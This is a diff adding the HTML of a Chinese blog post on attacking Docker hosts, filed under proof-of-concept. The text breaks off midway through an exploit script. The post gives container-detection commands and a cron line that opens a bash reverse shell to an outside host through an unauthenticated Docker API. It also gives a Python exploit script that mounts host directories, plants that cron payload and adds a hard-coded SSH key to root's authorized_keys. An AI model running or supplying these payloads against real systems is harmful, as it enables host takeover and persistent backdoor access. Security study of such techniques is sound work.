@@ -1,0 +1,497 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.3.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.1/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">
+
+<script class="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","version":"8.2.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true}};
+  </script>
+<meta name="description" content="Docker 是一个开源的应用容器引擎，基于 Go 语言 并遵从 Apache2.0 协议开源。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Docker">
+<meta property="og:url" content="http://example.com/2021/04/15/Docker/index.html">
+<meta property="og:site_name" content="隐秘行动">
+<meta property="og:description" content="Docker 是一个开源的应用容器引擎，基于 Go 语言 并遵从 Apache2.0 协议开源。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2021-04-14T19:52:06.000Z">
+<meta property="article:modified_time" content="2021-04-14T20:13:09.750Z">
+<meta property="article:author" content="nicaishui">
+<meta property="article:tag" content="Docker">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="http://example.com/2021/04/15/Docker/">
+
+
+<script class="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+<title>Docker | 隐秘行动</title>
+  
+
+
+
+
+  <noscript>
+  <style>
+  body { margin-top: 2rem; }
+
+  .use-motion .menu-item,
+  .use-motion .sidebar,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header {
+    visibility: visible;
+  }
+
+  .use-motion .header,
+  .use-motion .site-brand-container .toggle,
+  .use-motion .footer { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle,
+  .use-motion .custom-logo-image {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line {
+    transform: scaleX(1);
+  }
+
+  .search-pop-overlay, .sidebar-nav { display: none; }
+  .sidebar-panel { display: block; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">隐秘行动</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-主页"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>主页</a></li>
+        <li class="menu-item menu-item-关于"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+        <li class="menu-item menu-item-标签"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li>
+        <li class="menu-item menu-item-分类"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
+        <li class="menu-item menu-item-归档"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#API%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="nav-number">1.</span> <span class="nav-text">API未授权访问</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CVE-2019-5736%E9%80%83%E9%80%B8"><span class="nav-number">2.</span> <span class="nav-text">CVE-2019-5736逃逸</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#dirtycow%E9%80%83%E9%80%B8"><span class="nav-number">3.</span> <span class="nav-text">dirtycow逃逸</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#docker%E7%89%B9%E6%9D%83%E6%A8%A1%E5%BC%8F%E9%80%83%E9%80%B8"><span class="nav-number">4.</span> <span class="nav-text">docker特权模式逃逸</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#docker-sock%E9%80%83%E9%80%B8"><span class="nav-number">5.</span> <span class="nav-text">docker.sock逃逸</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CVE-2020-15257"><span class="nav-number">6.</span> <span class="nav-text">CVE-2020-15257</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="nicaishui"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">nicaishui</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">30</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">30</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/fakename" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;fakename" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:fakename@gmail.com" title="E-Mail → mailto:fakename@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://weibo.com/fakename" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;fakename" rel="noopener" target="_blank"><i class="fab fa-weibo fa-fw"></i>Weibo</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/fakename" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fakename" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+  </div>
+
+
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/04/15/Docker/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="nicaishui">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="隐秘行动">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Docker
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2021-04-15 03:52:06 / 修改时间：04:13:09" itemprop="dateCreated datePublished" datetime="2021-04-15T03:52:06+08:00">2021-04-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/POC/" itemprop="url" rel="index"><span itemprop="name">POC</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class=""></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>14k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>12 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>Docker 是一个开源的应用容器引擎，基于 <a target="_blank" rel="noopener" href="https://www.runoob.com/go/go-tutorial.html">Go 语言</a> 并遵从 Apache2.0 协议开源。<a id="more"></a></p>
+<p>判断docker：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;proc&#x2F;self&#x2F;cgroup</span><br><span class="line">cat &#x2F;.dockerenv</span><br></pre></td></tr></table></figure>
+<h1 id="API未授权访问"><a href="#API未授权访问" class="headerlink" title="API未授权访问"></a>API未授权访问</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">查看images</span><br><span class="line">2375:&#x2F;images&#x2F;json</span><br><span class="line">命令行查看images</span><br><span class="line">docker -H tcp:&#x2F;&#x2F;x.x.x.x:2375 images</span><br><span class="line">命令行创建容器并进入，将宿主机根目录挂载到容器&#x2F;tmp下</span><br><span class="line">docker -H tcp:&#x2F;&#x2F;x.x.x.x:2375 run -it -v &#x2F;:&#x2F;mnt imageID &#x2F;bin&#x2F;bash</span><br><span class="line"></span><br><span class="line">写计划任务反弹宿主机</span><br><span class="line">echo &#39;* * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;x.x.x.x&#x2F;8888 0&gt;&amp;1&#39; &gt;&gt; &#x2F;test&#x2F;var&#x2F;spool&#x2F;cron&#x2F;root</span><br></pre></td></tr></table></figure>
+<p>利用脚本：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8 -*-</span><br><span class="line">#author:L.N.@insight-labs.org</span><br><span class="line">#docker-py &#x3D;&#x3D; 1.8.1</span><br><span class="line"></span><br><span class="line">import urllib2</span><br><span class="line">import urllib</span><br><span class="line">import json</span><br><span class="line">import sys</span><br><span class="line">import getopt</span><br><span class="line">from docker import Client</span><br><span class="line"></span><br><span class="line">def http_get(url):</span><br><span class="line">    response &#x3D; urllib2.urlopen(url)</span><br><span class="line">    return response.read()</span><br><span class="line"></span><br><span class="line">def http_post(url, values):</span><br><span class="line">    jdata &#x3D; values</span><br><span class="line">    #print url</span><br><span class="line">    #print jdata</span><br><span class="line">    send_headers &#x3D; &#123;</span><br><span class="line">        &#39;Content-Type&#39;:&#39;application&#x2F;json&#39;</span><br><span class="line">    &#125;</span><br><span class="line">    req &#x3D; urllib2.Request(url, data&#x3D;jdata,headers&#x3D;send_headers)</span><br><span class="line">    response &#x3D; urllib2.urlopen(req)</span><br><span class="line">    return response.read()</span><br><span class="line"></span><br><span class="line">def isset(v):</span><br><span class="line">    try :</span><br><span class="line">        type(eval(v))</span><br><span class="line">    except:</span><br><span class="line">        return 0</span><br><span class="line">    else:</span><br><span class="line">        return 1</span><br><span class="line"></span><br><span class="line">def printport(portsList, name):</span><br><span class="line">    if isset(&quot;portsList[&#39;IP&#39;]&quot;) &#x3D;&#x3D; 0:</span><br><span class="line">        portsList[&#39;IP&#39;]&#x3D;&quot;*&quot;</span><br><span class="line">        printport(portsList,name)</span><br><span class="line">    elif isset(&quot;portsList[&#39;Type&#39;]&quot;) &#x3D;&#x3D; 0:</span><br><span class="line">        portsList[&#39;Type&#39;]&#x3D;&quot;*&quot;</span><br><span class="line">        printport(portsList,name)</span><br><span class="line">    elif isset(&quot;portsList[&#39;PublicPort&#39;]&quot;) &#x3D;&#x3D; 0:</span><br><span class="line">        portsList[&#39;PublicPort&#39;]&#x3D;&quot;*&quot;</span><br><span class="line">        printport(portsList,name)</span><br><span class="line">    elif isset(&quot;portsList[&#39;PrivatePort&#39;]&quot;) &#x3D;&#x3D; 0:</span><br><span class="line">        portsList[&#39;PrivatePort&#39;]&#x3D;&quot;*&quot;</span><br><span class="line">        printport(portsList,name)</span><br><span class="line">    else:</span><br><span class="line">        print &quot;[-]&quot;+name+&quot;[+]&quot;+portsList[&#39;Type&#39;]+&quot;[-]&quot;+portsList[&#39;IP&#39;]+&quot;:&quot;+str(portsList[&#39;PrivatePort&#39;])+&quot; --&gt; &quot;+host+&quot;:&quot;+str(portsList[&#39;PublicPort&#39;])</span><br><span class="line"></span><br><span class="line">def createClient(host,port,version):</span><br><span class="line">    clientApiVersion &#x3D; getversion(host,port,version)</span><br><span class="line">    print &quot;[-]ClientApiVersion:&quot;+clientApiVersion</span><br><span class="line">    cli &#x3D; Client(base_url&#x3D;&#39;tcp:&#x2F;&#x2F;&#39;+host+&#39;:&#39;+port,version&#x3D;clientApiVersion)</span><br><span class="line">    return cli</span><br><span class="line"></span><br><span class="line">def getversion(host,port,version):</span><br><span class="line">    url &#x3D; &quot;http:&#x2F;&#x2F;&quot;+host+&quot;:&quot;+port+&quot;&#x2F;version&quot;</span><br><span class="line">    ret &#x3D; json.loads(http_get(url))</span><br><span class="line">    if version !&#x3D; &#39;&#39;:</span><br><span class="line">        clientApiVersion &#x3D; version</span><br><span class="line">    else:</span><br><span class="line">        clientApiVersion &#x3D; ret[&#39;ApiVersion&#39;]</span><br><span class="line">    return clientApiVersion</span><br><span class="line"></span><br><span class="line">def printContainer(host,port,version,allContainer):</span><br><span class="line">    cli &#x3D; createClient(host,port,version)</span><br><span class="line">    if allContainer &#x3D;&#x3D; 1:</span><br><span class="line">        ret &#x3D; cli.containers(all&#x3D;True)</span><br><span class="line">    else:</span><br><span class="line">        ret &#x3D; cli.containers()</span><br><span class="line">    for info in ret:</span><br><span class="line">        print &quot;[+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++]&quot;</span><br><span class="line">        print &quot;[-] id: &quot;+info[&#39;Id&#39;]</span><br><span class="line">        print &quot;[-] Names: &quot;+info[&#39;Names&#39;][0]</span><br><span class="line">        print &quot;[-] Image: &quot;+info[&#39;Image&#39;]</span><br><span class="line">        print &quot;[-] Status: &quot;+info[&#39;Status&#39;]</span><br><span class="line">    print &quot;[+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++]&quot;</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    opts, args &#x3D; getopt.getopt(sys.argv[1:], &quot;v:kauVCcsLli:e:h:p:H:P:I:&quot;)</span><br><span class="line">    key &#x3D; 0</span><br><span class="line">    version &#x3D;&#39;&#39;</span><br><span class="line">    payload &#x3D;&#39;&#39;</span><br><span class="line">    sshkey &#x3D; &#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCoecC7vmWn4s2y4T+Pc3bJ0owDYWzGIBTCWWonN4qMTCbe66hKopgtUuHC1y5H3HFQ0qsni0vFAGSoO4TLiIpvHUXbf9Wi9vR2q4oYphH9Kgsd3cVXsHUFcgybwdk5DCXpmoSJTlEoOrtWajYdyuALMy+CqpkwWDj+uTz+9&#x2F;2P3T0Nh5F+U+UZOgSqIi5xQfUGJKGoFGXwvpqEL6UnGG4bbgGxVa5mJZVH0cxwKK6w7luezkcRVBEJ1SZAkjZOmZojyJbYQolItcBNBsXQ+cakjg3DeU69wrDiBdP+k2i2k3uzhJqJXfxLdxUZfjgXHwSOzDb2D5+841trASAwZAy1Gq4uwkbmwupe&#x2F;qTPK2R31d5h4Jqx4N19eUjT8GkkDj+mnJTwYyOPJH&#x2F;ghEvn4UfNOtohM2lZPbskvvskn82g0WzYJ5JnQaKfup1IYLTraBbJ5UdVYsCfG5ddRZF4xMab2ZDgcdqyISJxHPK9&#x2F;P7w7mmgSut1nK5R1+HLSl&#x2F;xDAPcoVd0H3ePqxN9ZD0BoMjY8fPxKAQR+bB5M05iDIIwUxhj2NQvCpwxxGwJXUSf13zirXRZhkZGnWrkNrzqHzpLZqoEBCEORErmFAvsI8yIBvThSylReiwhAWkdL7ONQ4dd7UgsQfY&#x2F;0MMfxd8&#x2F;V+041I1sIVUVBnHYUUwqE0eZ9Q&#x3D;&#x3D; wanniba@wanniba.com&#39;</span><br><span class="line">    for op, value in opts:</span><br><span class="line">        if op &#x3D;&#x3D;&quot;-l&quot;:</span><br><span class="line">            imagesList &#x3D; 1</span><br><span class="line">        elif op &#x3D;&#x3D; &quot;-i&quot;:</span><br><span class="line">            imageName &#x3D; value</span><br><span class="line">        elif op &#x3D;&#x3D; &quot;-e&quot;:</span><br><span class="line">            dataExec &#x3D; value</span><br><span class="line">        elif op &#x3D;&#x3D; &quot;-h&quot;:</span><br><span class="line">            host &#x3D; value</span><br><span class="line">        elif op &#x3D;&#x3D;&#39;-p&#39;:</span><br><span class="line">            port &#x3D; value</span><br><span class="line">        elif op &#x3D;&#x3D; &#39;-L&#39;:</span><br><span class="line">            portList &#x3D; 1</span><br><span class="line">        elif op &#x3D;&#x3D; &#39;-H&#39;:</span><br><span class="line">            lhsot &#x3D; value</span><br><span class="line">        elif op &#x3D;&#x3D; &#39;-P&#39;:</span><br><span class="line">            lport &#x3D; value</span><br><span class="line">        elif op &#x3D;&#x3D;&#39;-C&#39;:</span><br><span class="line">            createContainer &#x3D; 1</span><br><span class="line">        elif op &#x3D;&#x3D; &#39;-v&#39;:</span><br><span class="line">            version &#x3D; value</span><br><span class="line">        elif op &#x3D;&#x3D; &#39;-V&#39;:</span><br><span class="line">            version &#x3D; 1</span><br><span class="line">        elif op &#x3D;&#x3D; &#39;-c&#39;:</span><br><span class="line">            closeContainer &#x3D; 1</span><br><span class="line">        elif op &#x3D;&#x3D; &#39;-I&#39;:</span><br><span class="line">            imageId &#x3D; value</span><br><span class="line">        elif op &#x3D;&#x3D; &#39;-a&#39;:</span><br><span class="line">            allContainer &#x3D; 1</span><br><span class="line">        elif op &#x3D;&#x3D; &#39;-s&#39;:</span><br><span class="line">            startContainer &#x3D; 1</span><br><span class="line">        elif op &#x3D;&#x3D; &#39;-k&#39;:</span><br><span class="line">            key &#x3D; 1</span><br><span class="line">        elif op &#x3D;&#x3D; &#39;-u&#39;:</span><br><span class="line">            isUbuntu &#x3D; 1</span><br><span class="line">            </span><br><span class="line">    if isset(&#39;lhsot&#39;) and isset(&#39;lport&#39;):</span><br><span class="line">        if isset(&#39;isUbuntu&#39;):</span><br><span class="line">            payload &#x3D; &#39;&#x2F;bin&#x2F;bash -c &quot;echo \\\&quot;*&#x2F;1 * * * * &#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;&#39;+lhsot+&#39;&#x2F;&#39;+lport+&#39; 0&gt;&amp;1\\\&quot; &gt;&gt; &#x2F;tmp&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root&quot;&#39; #chmod 600</span><br><span class="line">        else:</span><br><span class="line">            payload &#x3D; &#39;&#x2F;bin&#x2F;bash -c &quot;echo \\\&quot;*&#x2F;1 * * * * &#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;&#39;+lhsot+&#39;&#x2F;&#39;+lport+&#39; 0&gt;&amp;1\\\&quot; &gt;&gt; &#x2F;tmp&#x2F;spool&#x2F;cron&#x2F;root&quot;&#39;  #centos,redhat and so on</span><br><span class="line">        print &quot;[-]Paylaod: &quot;+payload</span><br><span class="line">    if sshkey !&#x3D;&#39;&#39; and key &#x3D;&#x3D; 1:</span><br><span class="line">        payload &#x3D; &#39;&#x2F;bin&#x2F;bash -c &quot;echo \\\&quot;&#39;+sshkey+&#39;\\\&quot; &gt;&gt; &#x2F;tmp1&#x2F;.ssh&#x2F;authorized_keys&quot;&#39;</span><br><span class="line">        print &quot;[-]Paylaod: &quot;+payload</span><br><span class="line">    if isset(&#39;host&#39;) and isset(&#39;port&#39;):</span><br><span class="line">        if isset(&#39;version&#39;) and version &#x3D;&#x3D; 1:</span><br><span class="line">            url &#x3D; &quot;http:&#x2F;&#x2F;&quot;+host+&quot;:&quot;+port+&quot;&#x2F;version&quot;</span><br><span class="line">            ret &#x3D; json.loads(http_get(url))</span><br><span class="line">            print &quot;[-] ApiVersion: &quot;+ret[&#39;ApiVersion&#39;]</span><br><span class="line">        elif isset(&#39;imagesList&#39;):</span><br><span class="line">            url &#x3D; &quot;http:&#x2F;&#x2F;&quot;+host+&quot;:&quot;+port+&quot;&#x2F;images&#x2F;json&quot;</span><br><span class="line">            ret &#x3D; json.loads(http_get(url))</span><br><span class="line">            for info in ret:</span><br><span class="line">                print &quot;RepoTags: &quot;+info[&#39;RepoTags&#39;][0]</span><br><span class="line">        elif isset(&#39;createContainer&#39;) and isset(&#39;imageName&#39;):</span><br><span class="line">            cli &#x3D; createClient(host,port,version)</span><br><span class="line">            container &#x3D; cli.create_container(image&#x3D;imageName, command&#x3D;&#39;&#x2F;bin&#x2F;bash&#39;, tty&#x3D;True, volumes&#x3D;[&#39;&#x2F;tmp&#39;,&#39;&#x2F;tmp1&#39;], host_config&#x3D;cli.create_host_config(binds&#x3D;[&#39;&#x2F;var:&#x2F;tmp:rw&#39;,&#39;&#x2F;root:&#x2F;tmp1:rw&#39;]))</span><br><span class="line">            print &quot;[-]Container ID:&quot;+container[&#39;Id&#39;]</span><br><span class="line">            print &quot;[-]Warning:&quot;+str(container[&#39;Warnings&#39;])</span><br><span class="line">            response &#x3D; cli.start(container&#x3D;container.get(&#39;Id&#39;))</span><br><span class="line">            if isset(&#39;isUbuntu&#39;):</span><br><span class="line">                cli.exec_start(exec_id&#x3D;cli.exec_create(container&#x3D;container.get(&#39;Id&#39;), cmd&#x3D;payload))</span><br><span class="line">                print &quot;[-]create crontabs ......&quot;</span><br><span class="line">                cli.exec_start(exec_id&#x3D;cli.exec_create(container&#x3D;container.get(&#39;Id&#39;), cmd&#x3D;&#39;chmod 600 &#x2F;tmp&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root&#39;))</span><br><span class="line">                print &quot;[-]chmod 600 